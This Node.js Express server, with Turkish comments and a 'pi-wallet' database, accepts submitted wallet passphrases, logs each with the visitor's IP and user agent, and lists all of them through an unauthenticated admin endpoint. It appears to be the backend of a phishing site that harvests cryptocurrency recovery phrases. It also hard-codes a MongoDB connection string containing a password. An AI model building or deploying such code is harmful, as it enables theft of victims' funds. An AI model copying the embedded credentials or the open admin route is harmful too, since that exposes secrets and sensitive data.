const express = require('express');
const path = require('path');
const { MongoClient, ServerApiVersion } = require('mongodb');
const mongoose = require('mongoose');
const dotenv = require('dotenv');
const Passphrase = require('./models/Passphrase');

dotenv.config();

const app = express();

// MongoDB bağlantı ayarları
const uri = "mongodb+srv://develophasan:Vkm79dHv9pQfUzgq@cluster0.dbj9u.mongodb.net/pi-wallet?retryWrites=true&w=majority&appName=Cluster0";

mongoose.connect(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true
  },
  dbName: 'pi-wallet',
  connectTimeoutMS: 30000,
  socketTimeoutMS: 60000
})
.then(() => {
  console.log("MongoDB bağlantısı başarılı!");
})
.catch(err => {
  console.error('MongoDB bağlantı hatası:', err);
});

// CORS ayarları
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json());
app.use(express.static(path.join(__dirname, 'build')));

// Hata yakalama middleware
app.use((err, req, res, next) => {
  console.error('Global error:', err);
  res.status(500).json({ 
    success: false, 
    error: 'Internal server error',
    details: process.env.NODE_ENV === 'development' ? err.message : undefined
  });
});

// Passphrase kaydetme endpoint'i
app.post('/api/save-passphrase', async (req, res, next) => {
  try {
    console.log('İstek alındı:', req.body);
    
    const { passphrase } = req.body;
    if (!passphrase) {
      return res.status(400).json({ success: false, error: 'Passphrase gerekli' });
    }

    const newPassphrase = new Passphrase({
      passphrase,
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      uniqueId: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
    });

    await newPassphrase.save();
    console.log('Passphrase kaydedildi:', newPassphrase._id);
    
    res.json({ success: true });
  } catch (error) {
    console.error('Kaydetme hatası:', error);
    next(error);
  }
});

// Admin endpoint'i
app.get('/api/admin/passphrases', async (req, res) => {
  try {
    const passphrases = await Passphrase.find().sort({ createdAt: -1 });
    res.json(passphrases);
  } catch (error) {
    res.status(500).json({ error: 'Veriler alınamadı' });
  }
});

// React router için catch-all route
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

const port = process.env.PORT || 3001;
app.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor`);
}); 